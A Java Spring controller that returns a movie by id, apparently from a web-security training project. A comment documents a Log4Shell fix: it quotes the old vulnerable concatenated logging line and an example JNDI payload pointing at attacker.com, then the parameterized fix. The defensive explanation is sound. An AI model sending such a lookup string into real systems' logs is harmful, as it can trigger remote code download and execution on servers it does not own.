package com.example.websecurity.api;

import com.example.websecurity.api.dto.MovieResponse;
import com.example.websecurity.facade.MovieFacade;
import com.example.websecurity.persistence.User;
import io.swagger.v3.oas.annotations.Operation;
import io.swagger.v3.oas.annotations.security.SecurityRequirement;
import lombok.RequiredArgsConstructor;
import lombok.extern.slf4j.Slf4j;
import org.springframework.http.ResponseEntity;
import org.springframework.security.core.Authentication;
import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.PathVariable;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RestController;

@RestController
@RequestMapping("/movie")
@RequiredArgsConstructor
@Slf4j
@SecurityRequirement(name = "Bearer Authentication")
public class MovieController {

    private final MovieFacade movieFacade;

    @Operation(summary = "Get movie by id", description = "Get movie by id")
    @GetMapping("/{id}")
    public ResponseEntity<MovieResponse> getMovieById(
            @PathVariable Long id,
            Authentication authentication
    ) {
        User user = (User) authentication.getPrincipal();

        /*
         * Fix vuln/log4j (Log4Shell - CVE-2021-44228):
         *
         * VULNERABLE pattern - string concatenation embeds user-controlled
         * data directly into the log message. With Log4j2 < 2.15.0 this
         * allows JNDI lookup evaluation, e.g. if `id` were a string like
         * "${jndi:ldap://attacker.com/exploit}", log4j would execute that
         * lookup and potentially download and run arbitrary code:
         *
         *   log.info("Movie Controller: User " + user.getEmail()
         *            + " requested a movie with id " + id);
         *
         * FIX 1 - version: log4j-core >= 2.17.1 (set in pom.xml).
         *         JNDI message lookups are disabled by default in 2.16+
         *         and completely removed from the lookup chain in 2.17+.
         *
         * FIX 2 - parameterized logging: user data is passed as a separate
         *         argument, never interpolated as part of the message pattern.
         *         Log4j treats {} placeholders as data, not as commands.
         */
        log.info("Movie Controller: User {} requested a movie with id {}", user.getEmail(), id);

        MovieResponse movieResponse = movieFacade.getMovieById(id);
        return ResponseEntity.ok(movieResponse);
    }
}
